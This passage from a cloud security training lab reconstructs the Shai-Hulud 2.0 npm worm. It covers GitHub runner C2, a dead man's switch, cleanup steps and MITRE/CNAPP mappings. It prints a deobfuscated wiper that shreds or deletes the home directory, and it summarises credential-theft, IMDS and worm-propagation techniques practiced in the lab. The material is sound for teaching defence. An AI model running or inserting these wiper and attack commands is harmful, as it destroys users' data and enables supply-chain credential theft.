| Account Manipulation | **T1098** | Persistence |
| Command and Scripting Interpreter: Cloud API | **T1059.009** | Execution |
| Exfiltration to Code Repository | **T1567.001** | Exfiltration |
| Web Service: Bidirectional Communication | **T1102.002** | Command and Control |

T1102.002 (Web Service: Bidirectional Communication) applies because GitHub Discussions serve as a bidirectional C2 channel -- the attacker posts commands, the runner executes them and reports results via workflow logs.

#### CNAPP Detection

| Component | Detection | Severity |
|---|---|---|
| **ASPM** | Self-hosted runner registered from unrecognized machine | **Critical** |
| **ASPM** | Workflow with `runs-on: self-hosted` and `RUNNER_TRACKING_ID: 0` | **Critical** |
| **ASPM** | Discussion-triggered workflow with potential expression injection | **High** |
| **CDR** | New GitHub repository with known campaign marker in description | **High** |

**What the SOC would see:** "Self-hosted runner 'SHA1HULUD' registered to repository `username/shai-hulud-c2-lab-xxx` from IP 203.0.113.x. Runner name matches known Shai-Hulud 2.0 IOC. Repository description matches campaign marker 'Sha1-Hulud: The Second Coming.'"

#### Defense

1. **Restrict self-hosted runner registration** to organization-managed machines via runner groups
2. **Audit all workflow files** for expression injection patterns (`${{ ... }}` in `run:` commands)
3. **Use ephemeral runners** (auto-scaling, destroyed after each job) instead of persistent self-hosted runners
4. **Monitor for the campaign marker** in repository descriptions across your organization
5. **Require workflow approval** for any PR that modifies `.github/workflows/` files
6. **Block `RUNNER_TRACKING_ID` override** in organization-level runner settings

#### Real-World Examples

- **Shai-Hulud 2.0 (November 2025)**: Exact technique. Runner named `SHA1HULUD`, Discussion-based C2 with expression injection, `RUNNER_TRACKING_ID: 0` for persistence.
- **GitHub Actions miners (2021-2022)**: Attackers registered self-hosted runners on public repositories to mine cryptocurrency
- **Codecov (2021)**: CI/CD supply chain attack that exfiltrated environment variables (including tokens) during build processes

---

## PHASE 5: The Dead Man's Switch (Documentation Only)

### Step 19: Understanding the Destructive Failsafe

#### Context

The real Shai-Hulud 2.0 worm included a destructive failsafe: if the malware completely lost access to both GitHub and npm -- meaning all tokens were revoked and no credentials could be recycled from other victims -- it would **securely wipe the victim's home directory**.

**We absolutely do NOT execute this in the lab.** This section documents the mechanism for educational purposes.

#### The Mechanism (Deobfuscated)

```javascript
// DEAD MAN'S SWITCH -- NEVER RUN THIS CODE
// Shown for educational purposes only.

if (!githubApi.isAuthenticated() && !fetchedToken && !npmToken) {
  // All authentication has failed. The worm is cornered.
  // DESTRUCTION TRIGGER:
  if (platform === "windows") {
    // Windows: delete all files, then overwrite freed disk space
    // del /F /Q /S: Force, Quiet, Recursive delete
    // cipher /W: Writes over freed disk space to prevent recovery
    Bun.spawnSync(["cmd.exe", "/c",
      'del /F /Q /S "%USERPROFILE%*" && ' +
      'for /d %%i in ("%USERPROFILE%*") do rd /S /Q "%%i" & ' +
      'cipher /W:%USERPROFILE%']);
  } else {
    // Linux/macOS: securely shred all writable files
    // find -type f -writable -user "$(id -un)": only files the current user owns
    // xargs -0 -r: handle filenames with spaces/special chars
    // shred -uvz -n 1: overwrite once, unlink (delete), zero-fill, verbose
    // The second find removes empty directories
    Bun.spawnSync(["bash", "-c",
      'find "$HOME" -type f -writable -user "$(id -un)" -print0 | ' +
      'xargs -0 -r shred -uvz -n 1 && ' +
      'find "$HOME" -depth -type d -empty -delete']);
  }
  process.exit(0);
}
```

#### Why This Is Dangerous

1. **Hostage dynamic**: If npm and GitHub simultaneously mass-revoked tokens during incident response, thousands of infected machines could trigger the wiper in parallel, creating cascading data destruction.
2. **Developer workstations**: The home directory contains source code, SSH keys, IDE settings, browser profiles, and years of accumulated work. Loss is catastrophic for individual developers.
3. **CI/CD environments**: If the worm ran in a CI/CD pipeline, the wiper could destroy build artifacts, caches, and configuration.
4. **Forensic destruction**: The `shred` command overwrites file contents before deletion, making forensic recovery extremely difficult.
5. **Irreversibility**: Unlike ransomware, there is no decryption key. The data is gone permanently.

#### MITRE ATT&CK

| Technique | ID | Tactic |
|---|---|---|
| Data Destruction | **T1485** | Impact |
| Inhibit System Recovery | **T1490** | Impact |

#### Defense

1. **Revoke tokens gradually** during incident response, monitoring for destructive behavior
2. **Maintain offline backups** of developer workstations and CI/CD environments
3. **Use EDR** to detect `shred`, `cipher /W`, and bulk file deletion commands
4. **Sandbox npm installs** in containers or VMs (the wiper only affects the container)
5. **Use read-only containers** in CI/CD (the wiper cannot modify read-only filesystems)

---

# PART 4: CLEANUP

**Critical: Clean up everything to avoid unexpected cloud charges and security risks.**

```bash
echo "=== CLEANUP ==="

# 1. Stop and remove the GitHub Actions runner
echo "--- Stopping self-hosted runner ---"
kill ${RUNNER_PID} 2>/dev/null
cd ${RUNNER_DIR} 2>/dev/null

# Get a removal token
REMOVE_TOKEN=$(curl -s -X POST \
  -H "Authorization: token ${GITHUB_PAT}" \
  -H "Accept: application/vnd.github+json" \
  "https://api.github.com/repos/${GITHUB_USERNAME}/${C2_REPO}/actions/runners/remove-token" 2>/dev/null | \
  jq -r '.token' 2>/dev/null)

if [ -n "${REMOVE_TOKEN}" ] && [ "${REMOVE_TOKEN}" != "null" ]; then
  RUNNER_ALLOW_RUNASROOT=1 ./config.sh remove --token "${REMOVE_TOKEN}" 2>/dev/null
  echo "Runner deregistered"
fi

rm -rf "${RUNNER_DIR}"
echo "Runner files removed"

# 2. Delete GitHub repositories
echo ""
echo "--- Deleting GitHub repositories ---"
for repo in "${C2_REPO}" "${VULN_REPO}"; do
  if [ -n "${repo}" ]; then
    curl -s -X DELETE \
      -H "Authorization: token ${GITHUB_PAT}" \
      -H "Accept: application/vnd.github+json" \
      "https://api.github.com/repos/${GITHUB_USERNAME}/${repo}"
    echo "Deleted repository: ${repo}"
  fi
done

# 3. Destroy all cloud infrastructure (all three providers)
echo ""
echo "--- Destroying cloud infrastructure ---"
cd ~/shai-hulud-lab/terraform
terraform destroy
# Type 'yes' when prompted. Takes 3-5 minutes.

# 4. Stop and remove Verdaccio
echo ""
echo "--- Removing Verdaccio ---"
docker stop verdaccio 2>/dev/null && docker rm verdaccio 2>/dev/null
sudo rm -rf ~/verdaccio-storage
echo "Verdaccio removed"

# 5. Clean up local files
echo ""
echo "--- Cleaning local files ---"
rm -rf ~/shai-hulud-lab
rm -rf ~/.shai-hulud-exfil
rm -rf ~/.shai-hulud-cascade-demo
rm -rf ~/.shai-hulud-runner
rm -rf ~/.bun  # Remove Bun installed by the dropper

# Remove Verdaccio tokens from .npmrc
sed -i '/localhost:4873/d' ~/.npmrc 2>/dev/null

# Remove attacker AWS CLI profile (if created)
aws configure set aws_access_key_id "" --profile attacker 2>/dev/null
aws configure set aws_secret_access_key "" --profile attacker 2>/dev/null

# 6. Unset all environment variables
echo ""
echo "--- Unsetting environment variables ---"
unset GITHUB_PAT GITHUB_USERNAME VICTIM_NPM_TOKEN
unset VULN_REPO C2_REPO RUNNER_PID RUNNER_DIR
unset WORM_EXFIL_DIR WORM_DRY_RUN WORM_REGISTRY WORM_NPM_TOKEN

echo ""
echo "=== CLEANUP COMPLETE ==="
```

### Manual Verification Checklist

After running the cleanup commands, verify manually:

- [ ] **AWS EC2**: No running instances with your prefix (check us-east-1 and other regions)
- [ ] **AWS IAM**: No roles or instance profiles with your prefix
- [ ] **AWS Secrets Manager**: No secrets with your prefix (check multiple regions)
- [ ] **AWS SSM**: No parameters with your prefix
- [ ] **AWS Key Pairs**: No key pairs with your prefix
- [ ] **Azure Resource Group**: Deleted (this removes all contained resources)
- [ ] **Azure Key Vault**: Check "Deleted vaults" in the portal and purge if needed
- [ ] **GCP Compute Engine**: No instances with your prefix
- [ ] **GCP Service Accounts**: No SAs with your prefix
- [ ] **GCP Secret Manager**: No secrets with your prefix
- [ ] **GitHub**: Both lab repositories deleted
- [ ] **GitHub**: No self-hosted runners registered to your account (check Settings > Actions > Runners)
- [ ] **Docker**: Verdaccio container stopped and removed
- [ ] **Local**: `~/.shai-hulud-*` directories removed
- [ ] **Local**: `~/.bun` directory removed (Bun runtime)
- [ ] **Local**: `~/.npmrc` has no Verdaccio tokens
- [ ] **Local**: No lingering `bun` or `trufflehog` processes (`ps aux | grep -E "bun|trufflehog"`)

---

# PART 5: SUMMARY

## What You Learned

### Cloud Concepts Checklist

Test yourself -- can you explain each of these?

- [ ] GitHub Actions `pull_request_target` vs `pull_request` triggers and the "pwn request" vulnerability
- [ ] GitHub Actions repository secrets: encryption, scoping, and how they are exposed to workflows
- [ ] GitHub Actions self-hosted runners: registration tokens, configuration, and security implications
- [ ] GitHub Actions expression injection: why `${{ }}` in `run:` commands enables arbitrary code execution
- [ ] npm `preinstall` lifecycle hooks: execution timing, privilege level, and transitive dependency impact
- [ ] npm automation tokens vs granular tokens vs OIDC-based trusted publishing
- [ ] npm registry API: package search, tarball download, and publication endpoints
- [ ] npm `--ignore-scripts` flag and `.npmrc` `ignore-scripts=true` as defense
- [ ] Verdaccio and private npm registries: how organizations self-host package management
- [ ] Bun runtime: why attackers install alternative JavaScript runtimes for detection evasion
- [ ] TruffleHog: how it scans 800+ credential patterns including git history, and how it gets weaponized
- [ ] AWS IMDS: IMDSv1 (simple GET, no auth) vs IMDSv2 (PUT session token required)
- [ ] AWS IMDS: the `http_tokens` Terraform setting and `http_put_response_hop_limit` for containers
- [ ] AWS Secrets Manager: `ListSecrets` + `GetSecretValue` across multiple regions
- [ ] AWS SSM Parameter Store: `GetParameter --with-decryption` for SecureString parameters
- [ ] Azure IMDS: Managed Identity token request with mandatory `Metadata: true` header
- [ ] Azure IMDS: token resource scoping (vault.azure.net, management.azure.com, etc.)
- [ ] Azure Key Vault: access policies vs RBAC, and REST API access with Bearer tokens
- [ ] GCP metadata server: service account token request with `Metadata-Flavor: Google` header
- [ ] GCP Secret Manager: REST API, base64-encoded secret payloads, version access
- [ ] GCP IAM: project-level vs resource-level role bindings for secretAccessor
- [ ] Worm self-propagation: the discovery-download-inject-bump-republish pipeline
- [ ] Transitive dependency cascading: how one infected package triggers payload N times
- [ ] Triple-Base64 encoding: obfuscation technique for evading content scanning
- [ ] Campaign markers: how the worm used repository descriptions for cross-victim coordination
- [ ] Cross-victim credential recycling: GitHub search for campaign repos to share stolen tokens
- [ ] Dead man's switch: `shred -uvz` on Linux, `cipher /W` on Windows
- [ ] mvnpm: how npm packages automatically mirror to Maven Central without security checks

### Attack Techniques Practiced

| Phase | Step | MITRE Technique | ID | What You Did |
|-------|------|----------------|-----|-------------|
| 0 | 1-5 | Supply Chain Compromise | T1195.002 | Built and exploited pull_request_target vulnerability |
| 0 | 2 | Unsecured Credentials: CI/CD | T1552.008 | Stole NPM_TOKEN from GitHub Actions secrets |
| 1 | 6-8 | Supply Chain Compromise | T1195.002 | Injected preinstall hook with real Bun dropper |
| 1 | 6 | Masquerading | T1036.004 | Installed Bun runtime disguised as dev environment setup |
| 2 | 9 | Credentials in Files | T1552.001 | Harvested .npmrc, .env, SSH keys via preinstall payload |
| 2 | 10 | Automated Collection | T1119 | Ran TruffleHog against git repositories with seeded secrets |
| 2 | 11a-b | Cloud Instance Metadata API | T1552.005 | SSH into EC2, curl IMDS, stole real IAM role credentials |
| 2 | 11e-g | Cloud Secrets Mgmt Stores | T1555.006 | Used stolen AWS creds for Secrets Manager + SSM |
| 2 | 12a-c | Steal Application Access Token | T1528 | SSH into Azure VM, stole real Managed Identity Bearer token |
| 2 | 12b-c | Cloud Secrets Mgmt Stores | T1555.006 | Used stolen token for Key Vault REST API |
| 2 | 13a-d | Cloud Instance Metadata API | T1552.005 | SSH into GCE, stole real SA OAuth2 token from metadata |
| 2 | 13c-d | Cloud Secrets Mgmt Stores | T1555.006 | Used stolen token for Secret Manager REST API |
| 3 | 14 | Supply Chain Compromise | T1195.002 | Worm self-propagated across 4 additional packages |
| 3 | 15 | Event Triggered Execution | T1546 | Demonstrated cascading preinstall through transitive deps |
| 4 | 16 | Exfil to Code Repository | T1567.001 | Uploaded triple-encoded data to GitHub repo |
| 4 | 17 | Account Manipulation | T1098 | Registered real self-hosted GitHub Actions runner |
| 4 | 18 | Cloud API Execution | T1059.009 | Created Discussion-based C2 with expression injection |
| 5 | 19 | Data Destruction | T1485 | Documented dead man's switch mechanism |

### Tools and Commands Used

- **Terraform** v1.11+ -- Multi-cloud infrastructure as code (AWS ~6.35, Azure ~4.63, GCP ~7.22)
- **Docker** -- Running Verdaccio private npm registry container
- **Verdaccio** -- Isolated npm registry for safe worm propagation simulation
- **npm** v10+ -- Package management, `preinstall` hooks, `npm publish`, `npm pack`, registry API
- **Bun** -- Alternative JavaScript runtime (installed by the real worm dropper for evasion)
- **TruffleHog** -- Open-source secret scanner (800+ credential patterns, git history scanning)
- **AWS CLI v2** -- `secretsmanager`, `ssm`, `sts`, `ec2` commands with stolen IMDS credentials
- **Azure CLI** -- `keyvault`, `login --identity` using Managed Identity
- **Google Cloud CLI** -- `gcloud compute ssh`, `gcloud secrets`
- **curl** -- Direct HTTP to IMDS (AWS/Azure/GCP), GitHub REST API, Verdaccio API, Key Vault REST API, Secret Manager REST API
- **SSH** -- Direct access into cloud VMs for real IMDS credential exploitation
- **GitHub REST API** -- Repository management, secret encryption, workflow deployment, runner registration, Discussion creation
- **Python** v3.11+ -- `package.json` manipulation, libsodium encryption (PyNaCl), JSON parsing
- **jq** -- Command-line JSON processing for API responses
- **base64** -- Triple-encoding for exfiltration obfuscation
- **sed** / **grep** -- Text processing for token extraction

### CNAPP Detection Full Mapping

| Step | Component | Detection | Severity | SOC Alert |
|------|-----------|-----------|----------|-----------|
| 1-5 | ASPM | `pull_request_target` checks out PR head code with secret access | Critical | Workflow executed untrusted code with access to NPM_TOKEN |
| 6-8 | SCA | Package version updated with new `preinstall` lifecycle script | Critical | @novatech/auth-helpers 2.4.2 adds preinstall hook not in 2.4.1 |
| 6 | CWP | `npm install` triggers `curl` to download external binary (Bun) | High | Unexpected binary download during package installation |
| 9 | CWP | Background process reading .npmrc, .env, .ssh/ credential files | Critical | Process accessing multiple credential paths in rapid succession |
| 10 | CWP | TruffleHog binary downloaded and executed on workload | High | Known security tool used in offensive context |
| 11 | CSPM | EC2 instance with IMDSv1 enabled | Critical | Instance allows unauthenticated metadata access |
| 11 | CDR | Burst of GetSecretValue calls across multiple secrets | Critical | Bulk secret retrieval from EC2 role |
| 11 | CIEM | IAM role has Resource: * on secretsmanager:GetSecretValue | High | Overprivileged instance role |
| 12 | CDR | Managed Identity token acquired by unusual process | High | IMDS token request outside normal application pattern |
| 12 | CDR | Bulk Key Vault SecretGet operations | Critical | Mass secret retrieval |
| 12 | CSPM | Key Vault allows public network access | Medium | Missing private endpoint |
| 13 | CDR | GCP metadata server token request from unexpected code path | High | SA token theft pattern |
| 13 | CDR | Bulk Secret Manager AccessSecretVersion calls | Critical | Mass secret access from Compute VM |
| 13 | CIEM | Service account has project-level secretAccessor role | High | Overprivileged SA binding |
| 14 | SCA+ASPM | Multiple packages updated simultaneously with identical payloads | Critical | Coordinated supply chain modification |
| 15 | SCA | Transitive dependency triggers preinstall hooks | High | Cascading lifecycle script execution |
| 16 | CDR | Repository created with known campaign marker description | High | Shai-Hulud IOC match |
| 17 | ASPM | Self-hosted runner registered from unrecognized host | Critical | Unauthorized runner 'SHA1HULUD' |
| 18 | ASPM | Discussion-triggered workflow on self-hosted runner | Critical | Potential expression injection C2 |
| 19 | CWP | shred/cipher commands targeting user home directory | Critical | Destructive wiper activity |

### MITRE ATT&CK Full Mapping

| Step | Technique ID | Technique Name | Tactic | Description |
|------|-------------|----------------|--------|-------------|
| 1-5 | T1195.002 | Supply Chain: Software Supply Chain | Initial Access | pull_request_target exploit to steal npm token |
| 2 | T1552.008 | Unsecured Credentials: CI/CD Variables | Credential Access | NPM_TOKEN exposed to untrusted workflow code |
| 6-8 | T1195.002 | Supply Chain: Software Supply Chain | Initial Access | Inject malicious preinstall hook into package |
| 6 | T1036.004 | Masquerading: Masquerade as Legitimate Application | Defense Evasion | Bun runtime installed as "dev environment setup" |
| 8 | T1546 | Event Triggered Execution | Persistence | preinstall hook runs on every npm install |
| 9 | T1552.001 | Unsecured Credentials: Files | Credential Access | Harvest .npmrc, .env, SSH keys from filesystem |
| 9 | T1082 | System Information Discovery | Discovery | Fingerprint host OS, user, platform |
| 10 | T1119 | Automated Collection | Collection | TruffleHog scans git history for 800+ credential types |
| 11 | T1552.005 | Cloud Instance Metadata API | Credential Access | Steal IAM role credentials via AWS IMDS |
| 11 | T1555.006 | Cloud Secrets Management Stores | Credential Access | Exfiltrate Secrets Manager + SSM Parameter Store |
| 11 | T1580 | Cloud Infrastructure Discovery | Discovery | Enumerate secrets across AWS regions |
| 12 | T1528 | Steal Application Access Token | Credential Access | Steal Azure Managed Identity Bearer token via IMDS |
| 12 | T1555.006 | Cloud Secrets Management Stores | Credential Access | Exfiltrate Key Vault secrets via REST API |
| 13 | T1552.005 | Cloud Instance Metadata API | Credential Access | Steal GCP SA token from metadata server |
| 13 | T1555.006 | Cloud Secrets Management Stores | Credential Access | Exfiltrate Secret Manager via REST API |
| 14 | T1195.002 | Supply Chain: Software Supply Chain | Initial Access | Worm self-propagation across npm packages |
| 14 | T1127 | Trusted Developer Utilities Proxy Execution | Defense Evasion | Abuse npm publish for automated propagation |
| 15 | T1546 | Event Triggered Execution | Execution | Cascading preinstall via transitive dependencies |
| 16 | T1567.001 | Exfiltration to Code Repository | Exfiltration | Upload triple-encoded data to GitHub repo |
| 16 | T1001 | Data Obfuscation | Command and Control | Triple-Base64 encoding to evade scanning |
| 17 | T1098 | Account Manipulation | Persistence | Register self-hosted runner on victim's machine |
| 18 | T1059.009 | Cloud API: Command Execution | Execution | C2 via GitHub Discussions expression injection |
| 18 | T1102.002 | Web Service: Bidirectional Communication | C2 | GitHub Discussions as bidirectional C2 channel |
| 19 | T1485 | Data Destruction | Impact | Dead man's switch (documented, not executed) |
| 19 | T1490 | Inhibit System Recovery | Impact | shred prevents forensic file recovery |

### Connections to Real-World Breaches

- **Shai-Hulud 2.0 (November 2025)**: This exact attack. 796 npm packages compromised, 25,000+ GitHub repos, ~14,000 secrets exposed across 487 organizations. PostHog, Zapier, Postman, AsyncAPI, Trigger.dev, ENS Domains confirmed affected. CISA, Microsoft, AWS, GitHub all issued emergency advisories. npm revoked all classic automation tokens on December 9, 2025.
- **Shai-Hulud v1 (September 2025)**: The predecessor. Phished npm maintainer Josh Junon via spoofed npmjs.help domain, compromised chalk and debug with 2.6B combined weekly downloads. Used postinstall instead of preinstall.
- **PostHog (November 2025)**: Patient zero for v2. GitHub user brwjbowkevj exploited pull_request_target to steal npm token from assign-reviewers workflow. Packages compromised within 5 days.
- **Trigger.dev (November 2025)**: Compromised via transitive dependency on infected PostHog package. Published detailed post-mortem documenting the cascading infection.
- **event-stream (2018)**: Social engineering gave attacker publish access to a 2M download/week package. Malicious code targeted a specific Bitcoin wallet application.
- **ua-parser-js (2021)**: Maintainer's npm account compromised via credential stuffing. Cryptominer injected into a package with 8M weekly downloads.
- **Codecov (2021)**: CI/CD credential theft via compromised bash uploader script. Environment variables (including tokens) exfiltrated during builds.
- **SolarWinds (2020)**: Build pipeline compromise injected a backdoor into signed software updates distributed to 18,000 organizations.

### What Makes This Scenario Harder Than Typical Training

1. **Real IMDS exploitation**: You SSH into actual cloud VMs and steal real temporary credentials from metadata services. Not a simulation -- real API tokens that work against real cloud APIs.
2. **Multi-cloud scope**: AWS IMDS, Azure IMDS, and GCP metadata server each have different URLs, header requirements, token formats, and API patterns. Understanding all three is essential for modern cloud security.
3. **Real Bun evasion**: The dropper actually installs the Bun runtime, demonstrating how attackers evade Node.js monitoring. You see a `bun` process where security tools expect `node`.
4. **Real TruffleHog**: The payload downloads and executes actual TruffleHog against seeded git repos. You see it find "deleted" credentials in git history that a simple file scan misses.
5. **Real pull_request_target exploit**: You build the vulnerable workflow, submit the malicious PR, and watch the token get stolen. This is the exact GitHub CI/CD exploit that started the PostHog compromise.
6. **Real GitHub Actions runner**: You register an actual self-hosted runner and observe GitHub dispatch workflows to your machine. The C2 channel uses legitimate GitHub infrastructure.
7. **Cascading dependency demonstration**: You watch the preinstall hook fire three times through a single meta-package install, making exponential propagation tangible.
8. **Six phases of kill chain**: The attack crosses npm, three cloud providers, GitHub Actions, and the local filesystem. Understanding all the trust relationships between these systems is the real challenge.
9. **Supply chain is the entry point**: Unlike most training labs where you attack infrastructure directly, here the entry point is the software supply chain. The cloud infrastructure is the second-order victim. The npm token is the master key.
10. **Destructive failsafe creates strategic complexity**: The dead man's switch means aggressive remediation risks triggering mass data destruction -- a novel threat model that most defenders have never encountered.
